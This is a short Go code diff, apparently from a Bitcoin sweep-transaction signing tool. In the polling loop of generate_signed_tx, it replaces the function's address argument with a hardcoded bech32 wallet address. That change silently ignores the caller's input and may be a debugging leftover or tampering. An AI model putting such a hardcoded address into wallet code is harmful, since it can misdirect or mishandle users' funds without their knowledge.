@@ -326,7 +326,7 @@ func generate_signed_tx(address string, accountName string, sweeptx *wire.MsgTx)
 	for {
 		time.Sleep(30 * time.Second)
 		receiveSweepSignatures := getSignSweep()
-		filteredSweepSignatures := filterSignSweep(receiveSweepSignatures, address)
+		filteredSweepSignatures := filterSignSweep(receiveSweepSignatures, "bc1qqafhk4zmsp9km532zstawqepquutgwvzmuw7xkmychmt4k9y72xquvc8ke")
 
 		if len(filteredSweepSignatures) <= 0 {
 			continue
